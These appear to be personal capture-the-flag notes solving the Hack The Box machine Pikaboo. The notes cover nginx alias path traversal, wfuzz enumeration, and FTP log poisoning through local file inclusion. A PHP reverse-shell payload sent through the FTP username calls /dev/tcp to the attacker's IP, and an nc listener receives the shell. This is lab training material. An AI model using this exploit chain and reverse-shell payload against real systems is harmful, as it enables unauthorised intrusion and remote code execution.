# # `Enumeration` -

![[Pasted image 20210721114129.png]]

### Checking /pokatdex.php -

![[Pasted image 20210721114304.png]]

Clicking on any Pokemon results -

![[Pasted image 20210721114649.png]]

- Url seems very interesting for LFI but no luck
- Some API stuff.


### Checking /admin -

![[Pasted image 20210721115006.png]]

Tried some defaults creds but didn't worked and throws an error -

![[Pasted image 20210721115211.png]]

- Apache running on Port 81 because nginx running on port 80(from nmap)


# Exploit -

Path Traversal due to misconfigured nginx alias -

[Reference](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

So gaining the knowledge from the above post we gonna try wfuzz to find directories.It is pretty easy just go to the endpoint which ask for the
creds and then use ../ and then go to the desired directory


### Wfuzz -

```bash
root@napster:~/Documents/HTB/Pikaboo# wfuzz -u http://10.10.10.249/admin../FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -t
 20 -f wfuzz.txt --hc 404
 
 Target: http://10.10.10.249/admin../FUZZ                                                                                                                      
Total requests: 43004                                                                                                                                         
                                                                                                                                                              
=====================================================================                                                                                         
ID           Response   Lines    Word       Chars       Payload                                                                                               
=====================================================================                                                                                         
                                                                                                                                                              
000000001:   403        9 L      28 W       274 Ch      ".php"                                                                                                
000000004:   401        14 L     54 W       456 Ch      "admin"                                                                                               
000000007:   403        9 L      28 W       274 Ch      ".html"                                                                                               
000000038:   403        9 L      28 W       274 Ch      ".htm"                                                                                        
000000209:   301        9 L      28 W       314 Ch      "javascript"                                                                                  
000000400:   403        9 L      28 W       274 Ch      "."                                                                                           
000000589:   403        9 L      28 W       274 Ch      ".htaccess"                                                                                   
000001091:   403        9 L      28 W       274 Ch      ".phtml"                                                                                      
000002138:   403        9 L      28 W       274 Ch      ".htc"                                                                                        
000003475:   403        9 L      28 W       274 Ch      ".html_var_DE"                                                                                
000004659:   200        109 L    312 W      5646 Ch     "server-status"                                                                               
000005736:   403        9 L      28 W       274 Ch      ".htpasswd"
<SNIP>
```

- We get 200 on `server-status`

### Checking /admin../server-status -

![[Pasted image 20210721122519.png]]

We find an intersesting entry of `admin-staging/index.php?page=/var/log/vsftpd.log&`

### Checking /admin../admin_staging -

![[Pasted image 20210721123308.png]]

We get in...

### Checking admin-staging/index.php?page=/var/log/vsftpd.log& -

We can access the log file -

![[Pasted image 20210721124006.png]]


# Log-Poisioning & RCE-

Some nice posts on how-to-do -

- [Medium](https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d)
- [Ftp Log Poisoning](https://secnhack.in/ftp-log-poisoning-through-lfi/)

### Logging via FTP -

```bash
root@napster:~/Documents/HTB/Pikaboo# ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:root): aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```

![[Pasted image 20210721131704.png]]

We can see the `A`'s in the log.


### Reverse Shell -

```bash
root@napster:~/Documents/HTB/Pikaboo# ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:root): <?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.151/9001 0>&1'"); ?>
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
root@napster:~/Documents/HTB/Pikaboo# curl http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```

Listener -

```bash
root@napster:~/Documents/HTB/Pikaboo# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.151] from (UNKNOWN) [10.10.10.249] 44936
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## User.txt -

```bash
www-data@pikaboo:/home/pwnmeow$ cd /home
www-data@pikaboo:/home$ ls -la
total 568
drwxr-xr-x  3 root    root      4096 May 10 10:26 .
drwxr-xr-x 18 root    root      4096 Jul  9 14:44 ..
drwxr-xr-x  2 pwnmeow pwnmeow 569344 Jul  6 20:02 pwnmeow
www-data@pikaboo:/home$ cd pwnmeow/
www-data@pikaboo:/home/pwnmeow$ ls
user.txt
www-data@pikaboo:/home/pwnmeow$ cat user.txt 
e2f0b946b02308612b44c4f389c2d64b
```
